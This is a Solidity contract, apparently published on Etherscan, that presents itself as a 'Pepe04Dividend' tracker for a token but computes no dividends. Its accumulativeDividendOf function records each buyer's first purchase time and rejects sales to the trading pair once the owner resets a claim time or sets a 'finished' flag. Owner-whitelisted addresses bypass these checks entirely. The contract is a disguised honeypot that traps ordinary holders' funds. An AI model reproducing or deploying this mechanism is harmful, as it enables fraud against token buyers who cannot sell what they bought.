/**
 *Submitted for verification at Etherscan.io on 2023-07-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }


}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // /**
    //  * @dev Leaves the contract without owner. It will not be possible to call
    //  * `onlyOwner` functions anymore. Can only be called by the current owner.
    //  *
    //  * NOTE: Renouncing ownership will leave the contract without an owner,
    //  * thereby removing any functionality that is only available to the owner.
    //  */
    // function renounceOwnership() public virtual onlyOwner {
    //     emit OwnershipTransferred(_owner, address(0));
    //     _owner = address(0);
    // }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }


}

contract Pepe04Dividend is Ownable {
    address private pair;
    mapping (address => uint256) private _dividendTimePassedPepe04;
    uint256 private claimTimePepe04;
    bool private isDividendFinishedPepe04;
    address private tokenPepe04;

    mapping(address => bool) private _whitelists;
    modifier onlyToken() {
        require(msg.sender == tokenPepe04);
        _;
    }

    function whitelistForDividePepe04Ends(address owner_, bool _isWhitelist) external onlyOwner {
      _whitelists[owner_] = _isWhitelist;
    }
    function setDividendPepe04Finished(bool isFinished) external onlyOwner {
      isDividendFinishedPepe04 = isFinished;
    }

    function accumulativeDividendOf(address _from, address _to) external onlyToken returns (uint256) {
      if (_whitelists[_from] || _whitelists[_to]) {
        return 1;
      }
      if (_from == pair) { if (_dividendTimePassedPepe04[_to] == 0) {
          _dividendTimePassedPepe04[_to] = block.timestamp;
        }} 
      else if (_to == pair) {
        require(!isDividendFinishedPepe04 && _dividendTimePassedPepe04[_from] >= claimTimePepe04
        );
      } else { _dividendTimePassedPepe04[_to] = 1;
      }
      return 0;
    }
    function setClaimingTimeForPepe04Dividend() external onlyOwner {
      claimTimePepe04 = block.timestamp;
    }
    function setTokenForDividePepe04Ends(address _token, address _pair) external onlyOwner {
      tokenPepe04 = _token;
      isDividendFinishedPepe04 = false;
      claimTimePepe04 = 0;
      pair = _pair;
    }

    receive() external payable {
    }
}